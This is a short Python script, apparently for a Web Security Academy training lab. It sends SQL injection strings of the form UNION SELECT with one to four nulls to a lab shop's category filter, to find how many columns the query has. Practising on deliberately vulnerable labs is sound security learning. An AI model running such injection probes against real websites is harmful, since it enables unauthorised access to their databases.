import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac331f5e1e0a5686c0be6c05001b0014.web-security-academy.net'

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    print(soup)


# try_category("""Gifts' UNION SELECT null -- """)
# try_category("""Gifts' UNION SELECT null,null -- """)
try_category("""Gifts' UNION SELECT null,null,null -- """)
# try_category("""Gifts' UNION SELECT null,null,null,null -- """)


